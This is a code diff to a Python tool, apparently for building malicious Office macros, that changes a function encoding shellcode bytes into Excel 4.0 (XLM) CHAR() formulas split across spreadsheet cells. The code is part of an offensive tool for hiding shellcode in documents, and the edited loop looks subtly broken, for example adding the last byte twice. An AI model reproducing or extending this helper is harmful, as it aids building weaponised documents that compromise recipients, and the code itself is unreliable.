@@ -122,14 +122,15 @@ xlm4macro = """
 def format_shellcode_for_xlm4(shellcode):                                                                                                                                                                                                                                                                                                                                                                     
     hshellcode = "="                                                                                                                                                                                                                                                                                                                                                                                  
     code_size = len(shellcode)
-    
+    s = 0
     for num, byte in enumerate(shellcode):
         if num != 0 and num%254 == 0: hshellcode += f"\n\n=CHAR({hex(byte)})," ;continue # limited to 255 char per cell
-        if num>0:                                                                                                                                                                                                                                                                                                                                                                     
+        if num > 1 and num%254 == 253:hshellcode += f"&CHAR({hex(byte)})" ;continue 
+        if num>0: 
             hshellcode += f"&CHAR({hex(byte)}),"                                                                                                                                                                                                                                                                                                                                                            
         if num == 0:                                                                                                                                                                                                                                                                                                                                                                                        
-            hshellcode += f"CHAR({hex(byte)})" 
-        
+            hshellcode += f"CHAR({hex(byte)})," 
+        if num == code_size-1: hshellcode += f"&CHAR({hex(byte)})"
     return hshellcode
 
 parser = argparse.ArgumentParser(description="help create office macro")
